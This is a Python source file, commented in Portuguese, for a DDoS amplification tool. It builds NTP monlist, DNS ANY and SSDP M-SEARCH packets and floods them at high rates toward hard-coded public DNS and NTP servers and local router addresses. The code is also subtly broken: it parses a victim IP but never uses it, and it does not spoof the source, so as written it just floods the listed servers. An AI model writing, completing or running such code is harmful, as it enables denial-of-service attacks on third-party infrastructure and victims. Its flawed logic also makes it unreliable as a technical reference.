import socket
import struct
import asyncio
import time
import random
import threading
from utils.network import parse_target

class FastLogger:
    """
    Logger não-bloqueante para alta frequência.
    Acumula logs em memória e flushes periodicamente para não travar o loop de eventos.
    """
    def __init__(self):
        self.buffer = []
        self.last_flush = time.time()
        self.lock = threading.Lock()
        
    def log(self, msg):
        with self.lock:
            self.buffer.append(msg)
            # Flush a cada 1 segundo para manter a tela responsiva
            if time.time() - self.last_flush >= 1.0:
                self.flush()
                
    def flush(self):
        with self.lock:
            if self.buffer:
                for msg in self.buffer:
                    print(msg)
                self.buffer.clear()
                self.last_flush = time.time()

# Instância global do logger
logger = FastLogger()

class AmplificationAttacker:
    def __init__(self, target):
        self.victim_ip, _ = parse_target(target)
        self.active = True
        self.stats = {"ntp": 0, "dns": 0, "ssdp": 0}
        
        # Listas de amplificadores públicos
        self.ntp_amplifiers = [
            "time.google.com", "time.cloudflare.com", "pool.ntp.org",
            "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org"
        ]
        self.dns_amplifiers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9"
        ]
        self.ssdp_amplifiers = [
            "192.168.1.1", "192.168.1.2", "192.168.1.3"
        ]

    def run(self, duration=60, concurrency=50):
        """
        Executa o ataque assíncrono.
        concurrency: Número de conexões simultâneas por vetor.
        """
        logger.log(f"[AMP] Iniciando ataque assíncrono com {concurrency} conexões simultâneas por vetor")
        
        # Cria um novo event loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Cria as tarefas
        tasks = []
        for _ in range(concurrency):
            tasks.append(self._ntp_task())
            tasks.append(self._dns_task())
            tasks.append(self._ssdp_task())
            
        async def run_attack():
            start_time = time.time()
            # Aguarda todas as tarefas terminarem ou serem canceladas
            await asyncio.gather(*tasks, return_exceptions=True)
            
        try:
            loop.run_until_complete(run_attack())
        except KeyboardInterrupt:
            logger.log("\n[!] Interrupção manual detectada.")
        finally:
            loop.close()
            self.stop()

    def stop(self):
        self.active = False
        logger.flush() # Garante que os últimos logs sejam impressos

    def _craft_ntp_monlist(self):
        """
        Cria pacote NTP para o comando 'monlist'.
        Estrutura: LI, VN, Mode, Stratum, Poll, Precision, Root Delay, Root Disp, Ref ID, Originate, Receive, Transmit
        """
        return struct.pack("!BBBBIHIIII", 
            0x1F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D4F4E20, 0x00, 0x00, 0x00)

    def _craft_dns_query(self):
        """
        Cria uma query DNS para o tipo 'ANY' (Amplificação DNS).
        O servidor responde com todos os registros disponíveis.
        """
        header = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
        domain = b"any.example.com"
        name = b""
        for label in domain.split(b"."):
            name += bytes([len(label)]) + label
        name += b"\x00"
        qtype_qclass = struct.pack("!HH", 255, 1)
        return header + name + qtype_qclass

    def _craft_ssdp_msearch(self):
        """
        Cria um pacote SSDP M-SEARCH.
        Dispara respostas de todos os dispositivos UPnP na rede.
        """
        return (
            b"M-SEARCH * HTTP/1.1\r\n"
            b"HOST: [::]:1900\r\n"
            b"MAN: \"ssdp:discover\"\r\n"
            b"MX: 1\r\n"
            b"ST: ssdp:all\r\n"
            b"\r\n"
        )

    async def _udp_sender(self, amplifiers, port, payload, stat_key, interval=0.001):
        """
        Função genérica para enviar UDP de forma assíncrona.
        interval: Pausa entre pacotes (1ms = 1000 pps por task)
        """
        loop = asyncio.get_event_loop()
        
        class UDPProtocol(asyncio.DatagramProtocol):
            def __init__(self):
                self.transport = None
                self.last_send = 0
                
            def connection_made(self, transport):
                self.transport = transport
                
            def send_packet(self, payload):
                self.transport.sendto(payload)
                self.last_send = time.time()
                
            def datagram_received(self, data, addr):
                pass # Ignora respostas para manter o loop rápido
                
            def error_received(self, exc):
                pass
                
            def connection_lost(self, exc):
                pass

        # Inicializa o protocolo
        protocol_factory = lambda: UDPProtocol()
        
        # Tenta criar o endpoint
        try:
            transport, protocol = await loop.create_datagram_endpoint(
                protocol_factory,
                remote_addr=(random.choice(amplifiers), port)
            )
        except Exception as e:
            logger.log(f"[ERR] Falha ao criar socket UDP: {e}")
            return

        while self.active:
            # Verifica se é hora de enviar (rate limiting)
            if time.time() - protocol.last_send >= interval:
                try:
                    protocol.send_packet(payload)
                    self.stats[stat_key] += 1
                except Exception:
                    # Se o socket falhar, reinicia
                    try:
                        transport.close()
                    except:
                        pass
                    # Reinicializa o socket
                    try:
                        transport, protocol = await loop.create_datagram_endpoint(
                            protocol_factory,
                            remote_addr=(random.choice(amplifiers), port)
                        )
                    except:
                        break
                        
            # Aguarda 1ms para não saturar o loop de eventos
            await asyncio.sleep(0.001)
            
        transport.close()

    async def _ntp_task(self):
        await self._udp_sender(self.ntp_amplifiers, 123, self._craft_ntp_monlist(), "ntp", interval=0.001)

    async def _dns_task(self):
        await self._udp_sender(self.dns_amplifiers, 53, self._craft_dns_query(), "dns", interval=0.001)

    async def _ssdp_task(self):
        await self._udp_sender(self.ssdp_amplifiers, 1900, self._craft_ssdp_msearch(), "ssdp", interval=0.001)